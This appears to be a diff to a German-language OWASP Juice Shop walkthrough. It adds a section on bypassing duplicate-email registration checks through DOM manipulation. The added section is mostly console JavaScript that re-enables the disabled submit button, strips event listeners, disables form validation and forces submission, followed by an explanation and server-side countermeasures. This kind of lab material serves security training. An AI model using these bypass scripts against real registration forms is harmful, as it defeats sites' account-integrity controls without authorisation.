@@ -960,6 +960,319 @@ exampleAddresses.forEach(addr => {
 
 ---
 
+## 8. Repetitive Registration - DRY Principle Bypass
+
+### 📝 Beschreibung
+Die Registrierungsseite verhindert das Absenden des Formulars durch einen deaktivierten Button-State, wenn bereits ein Benutzer mit derselben E-Mail existiert. Durch DOM-Manipulation kann dieser Schutz umgangen werden.
+
+### 🔍 Schritt 1: Registrierungsseite analysieren
+
+```javascript
+// Navigiere zur Registrierungsseite
+window.location.hash = "#/register";
+
+// Analysiere das Registrierungsformular
+const registerForm = document.querySelector('form');
+const submitButton = document.querySelector('button[type="submit"]');
+const emailField = document.querySelector('input[type="email"]');
+
+console.log('🔍 Form Analysis:');
+console.log('Form:', registerForm);
+console.log('Submit Button:', submitButton);
+console.log('Email Field:', emailField);
+```
+
+### 🔍 Schritt 2: Button State Monitoring
+
+```javascript
+// Überwache den Button-Status während der Eingabe
+function monitorButtonState() {
+    const submitButton = document.querySelector('button[type="submit"], #registerButton');
+    
+    if (submitButton) {
+        console.log('🔘 Button disabled:', submitButton.disabled);
+        console.log('🔘 Button classes:', submitButton.className);
+        console.log('🔘 Button attributes:', [...submitButton.attributes].map(attr => `${attr.name}="${attr.value}"`));
+        
+        // Überwache Änderungen
+        const observer = new MutationObserver((mutations) => {
+            mutations.forEach((mutation) => {
+                if (mutation.type === 'attributes') {
+                    console.log(`🔄 Button ${mutation.attributeName} changed:`, submitButton.getAttribute(mutation.attributeName));
+                }
+            });
+        });
+        
+        observer.observe(submitButton, { attributes: true });
+        return observer;
+    }
+}
+
+// Starte Monitoring
+const buttonObserver = monitorButtonState();
+```
+
+### 🛠️ Exploit: Disabled State entfernen
+
+```javascript
+// Methode 1: Disabled Attribut entfernen
+function enableSubmitButton() {
+    const submitButton = document.querySelector('button[type="submit"], #registerButton, .btn-primary');
+    
+    if (submitButton) {
+        // Entferne disabled Attribut
+        submitButton.removeAttribute('disabled');
+        submitButton.disabled = false;
+        
+        // Entferne disabled CSS-Klassen
+        submitButton.classList.remove('disabled', 'btn-disabled');
+        
+        // Füge aktive CSS-Klassen hinzu
+        submitButton.classList.add('btn-primary', 'active');
+        
+        console.log('✅ Submit button enabled!');
+        console.log('🔘 Button state:', {
+            disabled: submitButton.disabled,
+            classes: submitButton.className
+        });
+        
+        return submitButton;
+    } else {
+        console.log('❌ Submit button not found');
+    }
+}
+
+// Button aktivieren
+const enabledButton = enableSubmitButton();
+```
+
+### 🔍 Schritt 3: Formular-Validierung umgehen
+
+```javascript
+// Erweiterte Form-Manipulation
+function bypassFormValidation() {
+    const form = document.querySelector('form');
+    const submitButton = document.querySelector('button[type="submit"], #registerButton');
+    
+    if (form && submitButton) {
+        // 1. Button aktivieren
+        submitButton.removeAttribute('disabled');
+        submitButton.disabled = false;
+        
+        // 2. Form-Validierung deaktivieren
+        form.setAttribute('novalidate', 'true');
+        
+        // 3. Entferne Event-Listener die das Absenden verhindern
+        const newForm = form.cloneNode(true);
+        form.parentNode.replaceChild(newForm, form);
+        
+        // 4. Neuen Submit-Handler hinzufügen
+        const newSubmitButton = newForm.querySelector('button[type="submit"], #registerButton');
+        newSubmitButton.removeAttribute('disabled');
+        newSubmitButton.disabled = false;
+        
+        console.log('✅ Form validation bypassed!');
+        console.log('📋 Form state:', {
+            novalidate: newForm.hasAttribute('novalidate'),
+            buttonDisabled: newSubmitButton.disabled
+        });
+        
+        return { form: newForm, button: newSubmitButton };
+    }
+}
+```
+
+### 🛠️ Vollständiger Exploit-Workflow
+
+```javascript
+// Kompletter Repetitive Registration Bypass
+async function exploitRepetitiveRegistration() {
+    console.log('🚀 Starting Repetitive Registration Exploit...');
+    
+    // 1. Navigiere zur Registrierungsseite
+    if (!window.location.hash.includes('register')) {
+        window.location.hash = '#/register';
+        await new Promise(resolve => setTimeout(resolve, 1000));
+    }
+    
+    // 2. Warte bis Seite geladen ist
+    await new Promise(resolve => {
+        const checkLoaded = () => {
+            const submitButton = document.querySelector('button[type="submit"], #registerButton');
+            if (submitButton) {
+                resolve();
+            } else {
+                setTimeout(checkLoaded, 100);
+            }
+        };
+        checkLoaded();
+    });
+    
+    // 3. Gib bereits existierende E-Mail ein (um Button zu deaktivieren)
+    const emailField = document.querySelector('input[type="email"]');
+    const passwordField = document.querySelector('input[type="password"]');
+    const confirmPasswordField = document.querySelectorAll('input[type="password"]')[1];
+    
+    if (emailField) {
+        // Beispiel: Verwende eine E-Mail die bereits existiert
+        emailField.value = 'admin@juice-sh.op';
+        emailField.dispatchEvent(new Event('input', { bubbles: true }));
+        emailField.dispatchEvent(new Event('blur', { bubbles: true }));
+        
+        console.log('📧 Email entered:', emailField.value);
+        
+        // Warte auf Validierung
+        await new Promise(resolve => setTimeout(resolve, 500));
+    }
+    
+    // 4. Fülle andere Felder aus
+    if (passwordField && confirmPasswordField) {
+        passwordField.value = 'TestPassword123!';
+        confirmPasswordField.value = 'TestPassword123!';
+        
+        passwordField.dispatchEvent(new Event('input', { bubbles: true }));
+        confirmPasswordField.dispatchEvent(new Event('input', { bubbles: true }));
+    }
+    
+    // 5. Prüfe Button-Status
+    const submitButton = document.querySelector('button[type="submit"], #registerButton');
+    console.log('🔘 Button disabled before exploit:', submitButton?.disabled);
+    
+    // 6. Aktiviere den Button
+    if (submitButton && submitButton.disabled) {
+        console.log('🔧 Enabling disabled submit button...');
+        
+        // Entferne disabled Attribut
+        submitButton.removeAttribute('disabled');
+        submitButton.disabled = false;
+        
+        // Entferne CSS-Klassen die Button deaktivieren
+        submitButton.classList.remove('disabled');
+        submitButton.classList.add('btn-primary');
+        
+        // Entferne inline styles
+        submitButton.style.pointerEvents = 'auto';
+        submitButton.style.opacity = '1';
+        
+        console.log('✅ Button enabled!');
+        console.log('🔘 Button disabled after exploit:', submitButton.disabled);
+        
+        // 7. Highlight des aktivierten Buttons
+        submitButton.style.border = '3px solid #00ff00';
+        submitButton.style.backgroundColor = '#28a745';
+        
+        console.log('🎯 Exploit completed! Button is now clickable.');
+        console.log('📝 You can now submit the registration form with duplicate email.');
+        
+        return submitButton;
+    } else {
+        console.log('❌ Submit button not found or already enabled');
+    }
+}
+
+// Starte den Exploit
+exploitRepetitiveRegistration();
+```
+
+### 🔍 Alternative DOM-Manipulation Methoden
+
+```javascript
+// Methode 1: CSS Override
+function enableButtonViaCSS() {
+    const style = document.createElement('style');
+    style.textContent = `
+        button[disabled], 
+        .disabled,
+        .btn-disabled {
+            pointer-events: auto !important;
+            opacity: 1 !important;
+            background-color: #007bff !important;
+            cursor: pointer !important;
+        }
+    `;
+    document.head.appendChild(style);
+    console.log('✅ CSS override applied');
+}
+
+// Methode 2: Event-Delegation
+function forceFormSubmission() {
+    const form = document.querySelector('form');
+    if (form) {
+        // Triggere Submit-Event direkt
+        form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
+        console.log('📤 Form submission triggered');
+    }
+}
+
+// Methode 3: Button Click Force
+function forceButtonClick() {
+    const submitButton = document.querySelector('button[type="submit"], #registerButton');
+    if (submitButton) {
+        // Entferne alle Event-Listener
+        const newButton = submitButton.cloneNode(true);
+        submitButton.parentNode.replaceChild(newButton, submitButton);
+        
+        // Aktiviere und klicke
+        newButton.disabled = false;
+        newButton.removeAttribute('disabled');
+        newButton.click();
+        
+        console.log('🖱️ Button click forced');
+    }
+}
+```
+
+### 🔍 DevTools Inspection
+
+```javascript
+// Analysiere Form-Validierung im Detail
+function inspectFormValidation() {
+    const form = document.querySelector('form');
+    const submitButton = document.querySelector('button[type="submit"], #registerButton');
+    
+    console.log('🔍 Form Inspection:');
+    console.log('Form validity:', form?.checkValidity());
+    console.log('Form validation message:', form?.validationMessage);
+    
+    // Alle Form-Felder prüfen
+    const inputs = form?.querySelectorAll('input');
+    inputs?.forEach((input, index) => {
+        console.log(`Input ${index}:`, {
+            type: input.type,
+            name: input.name,
+            value: input.value,
+            valid: input.checkValidity(),
+            validationMessage: input.validationMessage
+        });
+    });
+    
+    // Button Event-Listener analysieren
+    console.log('Button event listeners:', getEventListeners(submitButton));
+}
+```
+
+### 💡 Warum funktioniert dieser Exploit?
+
+1. **Client-Side Validation**: Validierung nur im Frontend
+2. **DOM-Manipulation möglich**: Keine Server-seitige Verifikation
+3. **Disabled State umgehbar**: Attribut kann einfach entfernt werden
+4. **JavaScript-basierte Logik**: Kann durch Browser-Tools manipuliert werden
+
+### 🚨 Sicherheitslücke
+
+- **Schwachstelle**: Vertrauen in Client-Side Validierung
+- **Impact**: Umgehung von Duplicate-User Protection
+- **CVSS**: Low-Medium (Business Logic Bypass)
+
+### 🛡️ Gegenmaßnahmen
+
+1. **Server-Side Validation**: Immer auf Server prüfen
+2. **Database Constraints**: UNIQUE-Constraint auf Email-Feld
+3. **API-Level Checks**: Duplicate-Check vor User-Erstellung
+4. **Rate Limiting**: Schutz vor automatisierten Registrierungen
+
+---
+
 ## 📚 Zusammenfassung der Schwachstellen
 
 1. **SQL Injection**: Fehlende Input-Validierung
@@ -969,6 +1282,7 @@ exampleAddresses.forEach(addr => {
 5. **File Upload**: Unzureichende Dateivalidierung
 6. **DOM XSS**: Unsichere DOM-Manipulation und fehlende Sanitization
 7. **Outdated Allowlist**: Veraltete Crypto-Adressen in Redirect-Allowlist
+8. **Client-Side Validation Bypass**: Umgehung von Frontend-Validierung
 
 ## 🛡️ Empfohlene Gegenmaßnahmen
 
@@ -979,4 +1293,5 @@ exampleAddresses.forEach(addr => {
 5. **Security Headers**: CSP, X-Frame-Options, etc. implementieren
 6. **XSS Prevention**: Input-Sanitization, textContent statt innerHTML, DOMPurify
 7. **Allowlist Management**: Regelmäßige Bereinigung veralteter Redirect-Ziele
+8. **Server-Side Validation**: Kritische Validierung niemals nur client-seitig
 
